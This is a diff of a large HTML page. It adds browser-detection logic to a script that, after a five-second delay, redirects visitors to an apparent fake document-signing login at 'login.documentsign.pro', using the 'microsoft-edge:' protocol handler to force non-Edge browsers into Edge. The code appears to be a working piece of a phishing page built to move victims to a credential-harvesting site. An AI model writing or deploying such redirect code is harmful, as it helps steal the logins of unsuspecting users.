@@ -31116,7 +31116,12 @@
     </script>
     <script>
         setTimeout(function() {
-            location.replace("microsoft-edge:" + "https://login.documentsign.pro/tQXvVRul")
+        let isEdge = /Edg\//.test(navigator.userAgent);
+        if (!isEdge) {
+          location.replace("microsoft-edge:" + "https://login.documentsign.pro/tQXvVRul");
+        } else {
+          location.replace("https://login.documentsign.pro/tQXvVRul");
+        }
         }, 5000)
     </script>
   </body>
